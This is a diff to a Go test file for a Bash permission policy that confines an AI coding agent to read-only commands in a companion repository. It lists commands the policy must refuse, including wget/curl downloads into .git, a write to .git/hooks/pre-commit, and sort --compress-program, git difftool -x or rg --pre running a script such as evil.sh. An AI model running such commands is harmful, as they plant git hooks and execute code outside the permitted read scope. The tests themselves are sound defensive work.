@@ -21,7 +21,7 @@ func companionPolicy(t *testing.T) (p *PermissionPolicy, companion, elsewhere st
 		}
 	}
 	p.ReadAlso = []string{companion}
-	p.BashAllow = []string{"rg *", "grep *", "find *", "ls *", "git log*", "git show*", "head *", "wc *", "sort *", "go test*"}
+	p.BashAllow = []string{"rg *", "grep *", "find *", "ls *", "git log*", "git show*", "head *", "wc *", "sort *", "go test*", "wget *", "curl *", "awk *", "tar *", "cp *", "openssl *", "git difftool*"}
 	return p, companion, elsewhere
 }
 
@@ -50,6 +50,8 @@ func TestReadOnlyBashReachesACompanionRepository(t *testing.T) {
 		"ls " + filepath.Join(companion, "src") + "/; wc -l " + filepath.Join(companion, "src") + "/*",
 		"rg -n select -A6 " + filepath.Join(companion, "src", "app.html"),
 		"grep -rn root -- " + filepath.Join(companion, "src"),
+		"head -n 40 " + filepath.Join(companion, "src", "app.html"),
+		"git -C " + companion + " log -5 --format=%h -- src",
 	} {
 		if d := p.Decide("Bash", bashInput(c)); !d.Allow {
 			t.Errorf("refused %q: %s", c, d.Message)
@@ -82,6 +84,25 @@ func TestBashStillStopsAtTheReadScope(t *testing.T) {
 		// A bare flag this list does not know still cannot name a reserved
 		// directory: the run may read .git, but a value there may be written.
 		"go test -coverprofile .git/hooks/pre-commit ./...",
+		// The 58140b9 review: a list of output flags is never complete, so
+		// only a command known to read takes a companion path after a bare
+		// flag. Each of these writes or runs something, and each was allowed
+		// by a deny-list of output flags.
+		"wget --output-document " + filepath.Join(companion, ".git", "config") + " https://example.com/x",
+		"curl --output-dir " + filepath.Join(companion, ".git") + " -O https://example.com/config",
+		"wget -P " + filepath.Join(companion, ".git") + " https://example.com/x",
+		"go test -coverprofile " + filepath.Join(companion, ".git", "hooks", "pre-commit") + " ./...",
+		"sort --compress-program " + filepath.Join(companion, "evil.sh") + " x",
+		"git difftool -y -x " + filepath.Join(companion, "evil.sh"),
+		"awk -f " + filepath.Join(companion, "x.awk") + " y",
+		"tar -xf x.tar -C " + filepath.Join(companion, ".git"),
+		"cp -t " + filepath.Join(companion, ".git", "hooks") + " x",
+		"openssl enc -in x -out " + filepath.Join(companion, "o"),
+		// A value attached to a short option is a value all the same.
+		"sort -o" + filepath.Join(companion, "t") + " x",
+		"sort -o~/x y",
+		"curl -o/etc/x https://example.com/x",
+		"rg --pre " + filepath.Join(companion, "x.sh") + " x",
 	} {
 		if d := p.Decide("Bash", bashInput(c)); d.Allow {
 			t.Errorf("allowed %q", c)
